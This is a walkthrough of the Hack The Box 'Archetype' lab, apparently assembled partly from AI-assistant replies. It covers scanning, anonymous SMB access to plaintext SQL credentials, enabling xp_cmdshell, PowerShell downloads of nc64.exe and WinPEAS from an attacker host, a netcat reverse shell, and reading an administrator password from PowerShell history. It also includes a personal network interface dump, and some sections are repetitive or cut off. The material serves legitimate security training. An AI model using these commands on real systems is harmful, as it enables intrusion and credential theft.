## Introduction

This report documents the completion of the Archetype challenge from Hack The Box. Through this exercise, participants will gain knowledge and practical experience in:

- Network scanning and enumeration
- SMB share access and enumeration
- Microsoft SQL Server exploitation
- Windows privilege escalation techniques
- Credential harvesting and lateral movement
- Command execution via SQL Server

**Difficulty:** Very Easy

**Tools Used:**
- **Nmap** - Used for initial port scanning and service enumeration
- **SMBClient** - Used to enumerate and access SMB shares
- **Impacket** - Used for MSSQL authentication and command execution
- **WinPEAS** - Used for Windows privilege escalation enumeration
- **Netcat** - Used to establish reverse shell connections

**Flags to Capture:** 2
- User Flag: Located in the sql_svc user's desktop directory
- Root Flag: Located in the Administrator's desktop directory


## Task Breakdown

### Task 1: Which TCP port is hosting a database server?

**Question:** Which TCP port is hosting a database server?

**Solution:**
```bash
nmap -sV -p- --min-rate=1000 10.10.10.x
```

**Solution:**
```bash
nmap -sC -sV {TARGET_IP}
```

This command performs a comprehensive port scan with service version detection, revealing port 1433 running Microsoft SQL Server 2017.

**Importance:** Identifying open ports and services is the first critical step in penetration testing, allowing us to discover potential attack vectors.

**Flag Captured:** None (information gathering)

# Nmap `-sC` vs `-p-`: Key Differences

## `-sC` (Script Scan)

**What it does:**
- Runs default Nmap scripts against discovered open ports
- Equivalent to `--script=default`
- Performs additional enumeration on services (banner grabbing, version detection, etc.)

**Advantages:**
- Provides deeper information about services
- Identifies common vulnerabilities and misconfigurations
- Automates basic enumeration tasks
- Faster than running individual scripts manually

**Disadvantages:**
- Can be noisy and detectable by security systems
- May trigger alerts or be blocked by firewalls
- Only runs against default ports unless combined with port specifications
- Can potentially crash unstable services

## `-p-` (All Ports Scan)

**What it does:**
- Scans all 65,535 TCP ports (port range 1-65535)
- By default, Nmap only scans the most common 1,000 ports

**Advantages:**
- Comprehensive coverage - finds services on non-standard ports
- Discovers hidden or obscured services
- Essential for thorough penetration testing
- Can reveal security through obscurity attempts

**Disadvantages:**
- Significantly slower than default port scans
- More network traffic generated
- More likely to trigger IDS/IPS alerts
- Can take hours on slow networks or when scanning multiple hosts

## Best Practices

These options serve different purposes and are often used together:

```bash
# Comprehensive scan with both options
nmap -sC -sV -p- 10.129.211.161

# Faster two-phase approach
nmap -sV 10.129.211.161         # Quick scan of common ports
nmap -sC -sV -p- 10.129.211.161 # Full scan after initial recon
```

For CTFs like Hack The Box, a common strategy is to start with a quick scan of common ports, then run a comprehensive scan in the background while you begin working with the services you've already discovered.

# Nmap Scan Duration Guidelines

The time you should wait for Nmap to complete depends on several factors:

## Typical Scan Times

- **Default scan** (`nmap <target>`): 2-5 minutes
- **Service version scan** (`nmap -sV <target>`): 5-10 minutes
- **Script scan** (`nmap -sC <target>`): 5-15 minutes
- **All ports scan** (`nmap -p- <target>`): 15-60+ minutes
- **Comprehensive scan** (`nmap -sC -sV -p- <target>`): 30-90+ minutes

## Factors Affecting Duration

1. **Network conditions**: Latency, packet loss, and bandwidth limitations
2. **Target responsiveness**: Firewalls, rate limiting, or slow services
3. **Scan options**: More aggressive options take longer
4. **Number of open ports**: More open ports = more service detection time
5. **Target hardware**: Virtual machines or resource-constrained targets respond slower

## Best Practices

- **Use timing templates** for faster scans: `nmap -T4 <target>`
- **Increase minimum rate**: `nmap --min-rate=1000 -p- <target>`
- **Run in phases**:
  ```bash
  # Quick scan first
  nmap -T4 -F <target>
  
  # Then comprehensive scan in background
  nmap -sC -sV -p- <target> -oN full_scan.txt &
  ```
- **Set a reasonable timeout**: `nmap --host-timeout 30m <target>`

## When to Stop a Scan

- If a scan has been running for over 2 hours with no progress
- If you're seeing many "giving up on port" messages
- If you've already found the information you need

For CTF challenges like Hack The Box, a good approach is to start working with the ports you've already discovered while letting a comprehensive scan run in the background.

```bash
nmap -sC -sV 10.129.211.161                                                                                      
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-05 20:32 MDT
Nmap scan report for 10.129.211.161
Host is up (0.074s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
```


#### Troubleshooting Common Issues

```bash
nmap -sV -p- --min-rate=1000 10.129.141.44
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-27 17:58 MDT
Warning: 10.129.141.44 giving up on port because retransmission cap hit (10).
```
This warning indicates that:

1. Nmap attempted to send packets to a specific port on the target IP (10.129.141.44)
2. Nmap didn't receive a response after 10 retransmission attempts (the default cap)
3. As a result, Nmap "gave up" on that particular port and marked it as filtered/uncertain

This typically happens when:

- Packets are being dropped by a firewall
- Network congestion is causing packet loss
- The target host is rate-limiting responses
- There's an unstable network connection between you and the target

When Nmap hits the retransmission cap, it can't definitively determine if the port is open, closed, or filtered, which might lead to incomplete scan results. You might want to:

1. Try running the scan again to see if it was a temporary network issue
2. Use the `--max-retries` parameter to increase the retransmission attempts
3. Slow down the scan with `--min-rate` set to a lower value to reduce network congestion

This warning doesn't necessarily mean the scan failed completely - it just indicates that some ports might not have been accurately classified.

### Task 2: What is the name of the non-Administrative share available over SMB?

**Question:** What is the name of the non-Administrative share available over SMB?

**Solution:**
```bash
smbclient -L \\10.10.10.x -N
```
In the selected code `smbclient -L \\10.10.10.x -N`, the double backslashes (`\\`) have special significance:

The double backslashes are used to specify the UNC (Universal Naming Convention) path to the SMB server. In Windows networking and SMB protocol:

1. The first backslash indicates the beginning of a network path
2. The second backslash is needed because backslash is an escape character in many command-line environments

This is the standard syntax for accessing network shares in Windows and SMB protocols. The format is `\\server\share` where:
- `\\server` specifies the server name or IP address (in this case, 10.10.10.x)
- The `-L` parameter tells smbclient to list the available shares on that server

If you were using this command in a Windows command prompt, you would only need a single backslash, but in Linux/Unix environments (including most penetration testing tools), you need to escape the backslash with another backslash.

This is particularly important in the context of this CTF because it shows you're properly formatting the SMB connection string to enumerate the target's SMB shares, which is a critical step in the reconnaissance phase of the attack.


This command lists available SMB shares without requiring authentication (-N), revealing the "backups" share among standard administrative shares.


Looking at the SMB shares output:

```bash
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
backups         Disk
C$              Disk      Default share
IPC$            IPC       Remote IPC
```

You should identify "backups" as the non-administrative share because:

1. The other three shares (ADMIN$, C$, and IPC$) are standard Windows administrative shares:
   - ADMIN$ - Maps to the Windows directory, used for remote administration
   - C$ - Maps to the C: drive root, a default administrative share
   - IPC$ - Inter-Process Communication share, used for named pipes

2. The "backups" share:
   - Doesn't have the $ suffix (administrative shares typically end with $)
   - Doesn't have a "Remote Admin" or "Default share" comment
   - Is clearly a custom share created for a specific purpose
   - Has a name suggesting it contains backup data (potentially sensitive)

In penetration testing, custom shares like "backups" are high-value targets because they:
- Often contain sensitive data
- May have weaker permissions than administrative shares
- Are created for specific business purposes
- Could contain configuration files, credentials, or other valuable information

This is why "backups" is the correct answer to the question about the non-administrative share.

The error messages in the selected code:

```bash
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.141.44 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
These messages tell you:

1. After successfully listing the shares, `smbclient` is attempting to reconnect using SMB1 protocol specifically to list workgroups (not shares).

2. This secondary connection failed with error `NT_STATUS_RESOURCE_NAME_NOT_FOUND`, which indicates the server couldn't find the requested resource name (in this case, likely the workgroup name).

3. As a result, `smbclient` couldn't retrieve the workgroup listing.

Importantly, these errors are **not** preventing you from accessing the shares themselves. They only affect the workgroup listing functionality, which is separate from share access. This is a common misunderstanding.

The key points:
- The share listing was successful (you can see ADMIN$, C$, IPC$, and backups)
- The error only occurs when trying to list workgroups, which is not necessary for accessing shares
- You can still connect to and access the "backups" share despite these errors
- These messages often appear in penetration testing scenarios and can be safely ignored if your goal is to access the shares

This is valuable information because it shows you can proceed with connecting to the "backups" share even though the workgroup listing failed.

**Importance:** Discovering accessible SMB shares can provide valuable information and potential entry points into the target system.

### Task 3: What is the password identified in the file on the SMB share?

**Question:** What is the password identified in the file on the SMB share?

**Solution:**
```bash
smbclient -N \\\\{TARGET_IP}\\backups
get prod.dtsConfig
exit
cat prod.dtsConfig
```

These commands connect to the backups share, download the configuration file, and reveal credentials stored in plaintext:
- Username: ARCHETYPE\sql_svc
- Password: M3g4c0rp123

**Importance:** This demonstrates how improper credential storage can lead to security breaches, as sensitive information is often left in configuration files.

**Flag Captured:** None (credential discovery)

the contents of the file will look like this:

```bash
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```
Key components:

1. **File Type**: This is a DTS (Data Transformation Services) configuration file, used by Microsoft SQL Server Integration Services (SSIS) for ETL (Extract, Transform, Load) operations.

2. **Generation Information**: The file was generated on January 20, 2019, as indicated by the `GeneratedDate` attribute.

3. **Configuration Type**: It's configuring a property (`ConfiguredType="Property"`) for a connection string.

4. **Path**: The configuration is for a connection destination (`Path="\Package.Connections[Destination].Properties[ConnectionString]"`).

5. **Connection String**: The most important part contains several critical pieces of information:
   - `Data Source=.` - The period indicates a local SQL Server instance
   - `Password=M3g4c0rp123` - The plaintext password for the SQL Server account
   - `User ID=ARCHETYPE\sql_svc` - The username in domain\user format
   - `Initial Catalog=Catalog` - The database name
   - `Provider=SQLNCLI10.1` - SQL Server Native Client 10.1 provider
   - `Persist Security Info=True` - Security information will be retained
   - `Auto Translate=False` - Character translation is disabled

From a penetration testing perspective, the most valuable information is:
- Username: `ARCHETYPE\sql_svc`
- Password: `M3g4c0rp123`

This is a significant security issue because:
1. The credentials are stored in plaintext
2. The file is accessible via an SMB share without authentication
3. These credentials likely provide access to the SQL Server running on port 1433
4. The domain username format (`ARCHETYPE\sql_svc`) suggests these might be domain credentials that could be used for lateral movement

This finding demonstrates a common security mistake: storing sensitive credentials in configuration files that aren't properly secured. In a real-world scenario, this could lead to unauthorized database access and potentially further compromise of the system.

These commands connect to the backups share, download the configuration file, and reveal credentials stored in plaintext.

**Importance:** This demonstrates how improper credential storage can lead to security breaches, as sensitive information is often left in configuration files.

**Note**
the `-N` flag is used to connect without a password, which is appropriate for this share.

**Troubleshooting Common Issues**

If you're seeing the error message:

```bash
smbclient \\\\10.129.141.44\\backups -N
do_connect: Connection to 10.129.141.44 failed (Error NT_STATUS_IO_TIMEOUT)
```

This indicates a connection timeout when trying to connect to the "backups" share. This is different from the previous error about workgroup listing - this is actually preventing you from accessing the share. Here's what you can do:

1. **Check your VPN connection** - Make sure your VPN to the HTB network is still active and stable. Connection timeouts often occur when the VPN connection is unstable.

2. **Verify the target is still up** - Try pinging the target to see if it's responsive:
   ```bash
   ping 10.129.141.44
   ```

3. **Try different SMB protocol versions** - Sometimes older or newer SMB versions work better:
   ```bash
   smbclient \\\\10.129.141.44\\backups -N --option='client min protocol=SMB2'
   ```
   or
   ```bash
   smbclient \\\\10.129.141.44\\backups -N --option='client max protocol=SMB3'
   ```

4. **Try with explicit credentials** - Use guest account or null session:
   ```bash
   smbclient \\\\10.129.141.44\\backups -U 'guest%'
   ```
   (This uses 'guest' username with empty password)

5. **Check if the machine needs to be reset** - In HTB, sometimes machines need to be reset if they've been used for a while:
   - Go to the machine page on the HTB website
   - Click "Reset" and wait for the machine to restart
   - Try connecting again with the new IP address if it changed


### Task 4: What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?

**Question:** What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?

**Solution:**
```bash
mssqlclient.py ARCHETYPE/sql_svc:Password123@10.10.10.x -windows-auth
```
This command uses Impacket's mssqlclient.py script to authenticate to the MSSQL server using the discovered credentials.

**Importance:** This demonstrates how to leverage discovered credentials to access database services, which can often lead to further system compromise.

**Flag Captured:** None (gaining access)

This Impacket script allows for authenticated connections to MSSQL servers using the credentials discovered in the previous step.

**Importance:** Understanding specialized tools for database access is crucial for penetration testing against database servers.

**Troubleshooting Common Issues**

If you're seeing the error message:

```bash
mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.141.44 -windows-auth
mssqlclient.py: command not found
```
This error indicates that your system cannot find the `mssqlclient.py` script. This is happening because:

1. **The Impacket tools are not installed** on your system, or
2. **The Impacket scripts are not in your PATH**, or
3. **You're not running the command from the correct directory**

Here's how to fix it:

#### Option 1: Install Impacket if it's not installed
```bash
## Using pip
pip install impacket

## Or for the latest version from GitHub
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip install .
```

Using a virtual environment for Python packages like Impacket is a best practice. Here's how to set up a virtual environment and install Impacket:

```bash
# Create a virtual environment
python3 -m venv impacket-env
```

On Kali Linux, you might need to install the virtual environment package:

```bash
sudo apt install python3-venv
```
```bash
# Activate the virtual environment
# On Linux/macOS:
source impacket-env/bin/activate
# On Windows:
# impacket-env\Scripts\activate

# Install Impacket in the virtual environment
pip install impacket

# Or for the latest version from GitHub
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip install .

# Now you can run mssqlclient.py
mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.141.44 -windows-auth
````

#### Option 2: Specify the full path to the script
If Impacket is installed but not in your PATH:
```bash
## Find where the script is located
find / -name mssqlclient.py 2>/dev/null

## Then use the full path
/path/to/impacket/examples/mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.141.44 -windows-auth
```

#### Option 3: Navigate to the Impacket examples directory
```bash
## If you installed from GitHub
cd impacket/examples
python mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.141.44 -windows-auth

## If you installed via pip, the examples might be in:
cd /usr/share/doc/python3-impacket/examples/
python3 mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.141.44 -windows-auth
```

#### Option 4: Use Python to run the script
```bash
python /path/to/impacket/examples/mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.141.44 -windows-auth
```

In Kali Linux specifically, you might need to use:
```bash
/usr/bin/impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@10.129.141.44 -windows-auth
```

This is a common issue when working with penetration testing tools, as many specialized scripts require specific installation steps or need to be run from particular directories.


### Task 5: What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?

**Question:** What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?

**Solution:**


```sql
SELECT is_srvrolemember('sysadmin');
```
```sql
EXEC xp_cmdshell 'net user'; — privOn MSSQL 2005 you may need to reactivate xp_cmdshell
first as it’s disabled by default:
EXEC sp_configure 'show advanced options', 1; — priv
RECONFIGURE; — priv
EXEC sp_configure 'xp_cmdshell', 1; — priv
RECONFIGURE; — priv
```
```sql
EXEC xp_cmdshell 'whoami'
```

The xp_cmdshell extended stored procedure allows execution of operating system commands from within SQL Server. If not enabled, it can be activated with:

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

**Importance:** This highlights how misconfigured database servers can be leveraged to gain command execution on the underlying operating system.

**Flag Captured:** None (privilege escalation technique)

The `EXEC xp_cmdshell` command is executed within a Microsoft SQL Server session, not through SMB. Here's a step-by-step guide to clarify the process:

## Complete Process

1. **First, enumerate SMB shares to find the backups share**:
   ```bash
   smbclient -L \\\\10.129.211.161\\
   ```

2. **Access the backups share to get credentials**:
   ```bash
   smbclient \\\\10.129.211.161\\backups
   ```
   When prompted for a password, just press Enter (null password)

3. **Download and view the config file**:
   ```
   smb: \> get prod.dtsConfig
   smb: \> exit
   cat prod.dtsConfig
   ```
   This reveals SQL credentials (ARCHETYPE\sql_svc:M3g4c0rp123)

4. **Connect to the SQL Server using the credentials**:
   ```bash
   impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@10.129.211.161 -windows-auth
   ```
   If the command isn't found, you might need to install Impacket or use the full path

5. **Now you can execute xp_cmdshell within the SQL session**:
   ```sql
   SQL> EXEC sp_configure 'show advanced options', 1;
   SQL> RECONFIGURE;
   SQL> EXEC sp_configure 'xp_cmdshell', 1;
   SQL> RECONFIGURE;
   SQL> EXEC xp_cmdshell 'whoami';
   ```

```bash
EXEC xp_cmdshell 'whoami';
output
-----------------
archetype\sql_svc

NULL

```

## Troubleshooting

If `smbclient \\\\10.129.211.161\\backups` doesn't work, try:

1. **Check your syntax**:
   ```bash
   smbclient //10.129.211.161/backups -N
   ```
   The `-N` flag means no password

2. **Try with explicit SMB version**:
   ```bash
   smbclient //10.129.211.161/backups -N --option='client min protocol=SMB2'
   ```

3. **If Impacket isn't installed**:
   ```bash
   sudo apt install python3-impacket
   # Or
   pip install impacket
   ```

Remember, `xp_cmdshell` is executed within the SQL Server session after you've connected with the credentials found in the config file, not directly through SMB.


### Task 6: What script can be used in order to search possible paths to escalate privileges on Windows hosts?

**Question:** What script can be used in order to search possible paths to escalate privileges on Windows hosts?

**Solution:** WinPEAS

WinPEAS (Windows Privilege Escalation Awesome Scripts) is a powerful enumeration script that automatically searches for possible privilege escalation paths on Windows systems.


```bash
# Transfer WinPEAS to the target
powershell
wget http://{ATTACKER_IP}/winPEASx64.exe -outfile winPEASx64.exe
.\winPEASx64.exe
```

**Importance:** Automated privilege escalation scripts are essential for efficiently identifying potential escalation paths in complex Windows environments.

**Flag Captured:** None (privilege escalation technique)

# Using WinPEAS for Privilege Escalation

Let me explain in detail how to use WinPEAS for privilege escalation on the Windows server:

## 1. What is WinPEAS?

WinPEAS (Windows Privilege Escalation Awesome Script) is a tool that automatically searches for possible privilege escalation paths on Windows systems. It checks for:
- Misconfigurations
- Vulnerable services
- Stored credentials
- Weak permissions
- And many other privilege escalation vectors

## 2. Getting WinPEAS to the Target

First, you need to download WinPEAS on your attack machine and then transfer it to the target:

```bash
# On your attack machine
wget https://github.com/carlospolop/PEASS-ng/releases/download/20230423/winPEASx64.exe
```

Then set up a simple HTTP server on your attack machine:

```bash
python3 -m http.server 80
```
# Uploading nc64.exe to the Target Machine

You're right - we need to upload nc64.exe to the target machine before we can use it. Here's how to do it step by step:

## 1. Prepare Your Attack Machine

You've already done these steps:
- You have nc64.exe in ~/htb/archetype/nc64.exe
- You've started a Python HTTP server with `sudo python3 -m http.server 80`

## 2. Upload nc64.exe Using xp_cmdshell

Now, you need to use the SQL Server's xp_cmdshell to download the file from your HTTP server to the target machine:

```sql
-- In your SQL Server session (where you're already connected with impacket-mssqlclient)
EXEC xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://YOUR_IP_ADDRESS/nc64.exe -outfile nc64.exe"
```

Replace YOUR_IP_ADDRESS with your attack machine's IP address (your HTB VPN IP, not 127.0.0.1).

## 3. Verify the Upload

You can verify that the file was uploaded successfully:

```sql
EXEC xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; dir"
```

You should see nc64.exe in the directory listing.

## 4. Set Up a Netcat Listener

In a new terminal on your attack machine, start a netcat listener:

```bash
sudo nc -lvnp 443
```

## 5. Execute the Reverse Shell

Now, use xp_cmdshell to execute nc64.exe and establish a reverse shell:

```sql
EXEC xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe YOUR_IP_ADDRESS 443"
```

Again, replace YOUR_IP_ADDRESS with your attack machine's IP address.

## 6. Check Your Netcat Listener

If everything worked correctly, you should now have a command shell on your netcat listener. You can verify this by running commands like:

```cmd
whoami
hostname
ipconfig
```

## Troubleshooting

If you're having issues:

1. **Check your HTTP server logs** - You should see GET requests for nc64.exe
2. **Verify your IP address** - Make sure you're using your VPN IP, not localhost
3. **Check for firewall issues** - Try different ports if 443 is blocked
4. **Verify PowerShell execution** - Try a simple command first:
   ```sql
   EXEC xp_cmdshell "powershell -c echo 'Test'"
   ```

Remember, you're using the SQL Server as a conduit to execute PowerShell commands, which in turn download and execute nc64.exe to establish a reverse shell back to your machine.


## 3. Transferring WinPEAS to the Target

Now, you need to download WinPEAS onto the target machine. You'll do this using the SQL Server xp_cmdshell you've already accessed:

```sql
-- In your SQL Server session
EXEC xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://YOUR_IP_ADDRESS/winPEASx64.exe -outfile winPEASx64.exe"
```

Replace YOUR_IP_ADDRESS with your attack machine's IP address.

## 4. Running WinPEAS on the Target

You have two options to run WinPEAS:

### Option 1: Run directly through xp_cmdshell
```sql
EXEC xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\winPEASx64.exe"
```

However, this might not show all output clearly due to SQL Server's output limitations.

### Option 2: Get a proper shell first (recommended)

Set up a netcat listener on your attack machine:
```bash
nc -lvnp 443
```

```bash
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.x/x scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: enp2s0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc mq state DOWN group default qlen 1000
    link/ether a8:5e:45:12:xx:xx brd ff:ff:ff:ff:ff:ff
3: eno1: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc fq_codel state DOWN group default qlen 1000
    link/ether a8:5e:45:12:65:8f brd ff:ff:ff:ff:ff:ff
    altname enp0s31f6
4: wlp3s0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 50:eb:71:76:3a:45 brd ff:ff:ff:ff:ff:ff
    inet 10.0.0.186/24 brd 10.0.0.255 scope global dynamic noprefixroute wlp3s0
       valid_lft 119966sec preferred_lft 119966sec
    inet6 2601:681:8400:9a20:a7f1:c9cf:3220:4ede/64 scope global temporary dynamic
       valid_lft 301sec preferred_lft 301sec
    inet6 2601:681:8400:9a20:965d:bdd1:4f28:ddd2/64 scope global temporary deprecated dynamic
       valid_lft 301sec preferred_lft 0sec
    inet6 2601:681:8400:9a20:ca9b:abca:d67f:c754/64 scope global temporary deprecated dynamic
       valid_lft 301sec preferred_lft 0sec
    inet6 2601:681:8400:9a20:1741:e355:97e:a754/64 scope global temporary deprecated dynamic
       valid_lft 301sec preferred_lft 0sec
    inet6 2601:681:8400:9a20::c236/128 scope global dynamic noprefixroute
       valid_lft 47798sec preferred_lft 47798sec
    inet6 2601:681:8400:9a20:256f:9fe7:b871:7cf3/64 scope global temporary deprecated dynamic
       valid_lft 301sec preferred_lft 0sec
    inet6 2601:681:8400:9a20:3a04:a2a1:1ba:412d/64 scope global temporary deprecated dynamic
       valid_lft 301sec preferred_lft 0sec
    inet6 2601:681:8400:9a20:dc5e:e575:f784:b1ef/64 scope global dynamic mngtmpaddr noprefixroute
       valid_lft 301sec preferred_lft 301sec
    inet6 fe80::2a37:e438:b572:80bd/64 scope link noprefixroute
       valid_lft forever preferred_lft forever
5: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default
    link/ether 02:42:70:f8:60:85 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
6: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
    link/none
    inet 10.10.16.6/23 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 dead:beef:4::1004/64 scope global
       valid_lft forever preferred_lft forever
    inet6 fe80::656b:5512:6131:14ab/64 scope link stable-privacy
       valid_lft forever preferred_lft forever
```
Here’s a breakdown of the IP addresses and their purposes:

---
**lo (Loopback)**
- `inet 127.0.x.x/x`
  - **Purpose:** Localhost. Used for internal communication within your machine. Not accessible from outside.
- `inet6 ::1/128`
  - **Purpose:** IPv6 loopback. Same as above, but for IPv6.
---
**enp2s0 / eno1 (Ethernet interfaces)**
- No IP addresses assigned (interfaces are DOWN).
  - **Purpose:** Wired network interfaces, currently inactive.

---

**wlp3s0 (Wi-Fi interface)**
- `inet 10.0.0.186/24`
  - **Purpose:** Your main local (private) IPv4 address on the Wi-Fi network. Used for LAN communication.
- Multiple `inet6 .../64` and `/128`
  - **Purpose:** IPv6 addresses for your Wi-Fi interface. These include:
    - **Global temporary dynamic:** Used for outgoing connections, changes over time for privacy.
    - **Global dynamic:** Stable IPv6 address assigned by your network.
    - **Link-local:** Only valid on the local network segment.

---

**docker0 (Docker bridge)**
- `inet 172.17.0.1/16`
  - **Purpose:** Virtual network interface created by Docker. Used for communication between Docker containers and the host.

---

**tun0 (VPN tunnel)**
- `inet 10.10.16.6/23`
  - **Purpose:** IP address assigned to your VPN tunnel interface. Used for routing traffic through a VPN.
- `inet6 dead:beef:4::1004/64`
  - **Purpose:** Global IPv6 address for the VPN tunnel.
- `inet6 fe80::656b:5512:6131:14ab/64`
  - **Purpose:** Link-local IPv6 address for the VPN tunnel.

---

**Summary:**  
- `127.0.0.1` and `::1`: Localhost (internal only)
- `10.0.0.186`: Your Wi-Fi IPv4 address (LAN)
- `172.17.0.1`: Docker virtual network (for containers)
- `10.10.16.6`: VPN tunnel IPv4 address
- IPv6 addresses: Used for modern networking, privacy, and global reachability (depending on scope)

Then use xp_cmdshell to establish a reverse shell:
```sql
EXEC xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://YOUR_IP_ADDRESS/nc64.exe -outfile nc64.exe"
EXEC xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe YOUR_IP_ADDRESS 443"
```

Once you have a shell, run WinPEAS:
```cmd
cd C:\Users\sql_svc\Downloads
.\winPEASx64.exe
```

## 5. Finding Privilege Escalation Vectors

WinPEAS will output a lot of information. In this specific CTF, it will help identify that PowerShell history files might contain sensitive information.

Check the PowerShell history file:
```cmd
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

This reveals the Administrator password: `MEGACORP_4dm1n!!`

## 6. Escalating Privileges

Now that you have the Administrator password, you can use it to gain administrative access:

```bash
# On your attack machine
impacket-psexec ARCHETYPE/administrator:MEGACORP_4dm1n!!@10.129.211.161
```

This gives you a SYSTEM-level shell, effectively completing the privilege escalation.

## 7. Capturing the Root Flag

With administrative access, you can now capture the root flag:
```cmd
cd C:\Users\Administrator\Desktop
type root.txt
```

The key insight here is that WinPEAS helps automate the discovery of privilege escalation vectors, but you still need to exploit those vectors manually. In this case, it helps point you toward checking PowerShell history files, which contain the administrator credentials.


### Task 7: What file contains the administrator's password?

**Question:** What file contains the administrator's password?

**Solution:**
```bash
# First, set up a Python HTTP server on the attack machine
python3 -m http.server 80

# Then, set up a netcat listener
nc -lvnp 443

# Using xp_cmdshell, download netcat to the target
EXEC xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://{ATTACKER_IP}/nc64.exe -outfile nc64.exe"

# Establish a reverse shell
EXEC xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe {ATTACKER_IP} 443"

# Once the shell is established, navigate to the Desktop and read the user flag
cd C:\Users\sql_svc\Desktop
type user.txt
```

**Importance:** This demonstrates the complete attack chain from initial access to user compromise, utilizing command execution to establish a reverse shell.

**Flag Captured:** User Flag (actual value redacted)

# Understanding the `nc -lvnp 443` Command

The command `sudo nc -lvnp 443` sets up a netcat listener on your attack machine, which is essential for receiving the reverse shell connection from the target. Let me explain what this does and why it's important:

## What is this command?

`sudo nc -lvnp 443` breaks down as:

- `sudo`: Run with elevated privileges (needed to bind to port 443)
- `nc`: The netcat utility, a versatile networking tool
- `-l`: Listen mode (instead of connecting to a remote host)
- `-v`: Verbose output (shows more details about the connection)
- `-n`: Skip DNS resolution (use IP addresses directly)
- `-p 443`: Listen on port 443 (HTTPS port, often allowed through firewalls)

## Why run this before executing nc64.exe on the target?

1. **Establishes the receiving end**: The reverse shell needs somewhere to connect back to. This command creates that endpoint.

2. **Timing is critical**: You must have the listener running BEFORE executing the reverse shell command on the target. Otherwise, when the target tries to connect back, there will be nothing listening and the connection will fail.

3. **Order of operations**:
   - First, set up the listener on your attack machine
   - Then, execute the reverse shell command on the target
   - The target connects back to your listener
   - You now have interactive command-line access to the target

## What happens when it works?

When you run `sudo nc -lvnp 443`, you'll see output like:
```
listening on [any] 443 ...
```

After executing the reverse shell command on the target, you'll see:
```
connect to [YOUR_IP] from (UNKNOWN) [TARGET_IP] 49152
```

Then your terminal will show a Windows command prompt, indicating you have shell access to the target machine.

## Why port 443?

Port 443 (HTTPS) is commonly used for reverse shells because:
- It's often allowed through firewalls for outbound connections
- It blends in with normal HTTPS traffic
- Most environments don't block outbound HTTPS

This is why the writeup specifies running the listener first - it's a critical step in the process of establishing a reverse shell connection.

# Finding Your Attacker IP Address

Yes, you're correct - the "attacker IP" is your own IP address in this scenario. Here's how to find it:

## For HTB VPN Connection

Since you're working on a Hack The Box machine, you need to use your VPN IP address (the one assigned to you when you connected to the HTB VPN):

```bash
# Check your tun0 interface (HTB VPN)
ip addr show tun0
```
10.10.14.26/23
Look for the `inet` line which shows something like:
```
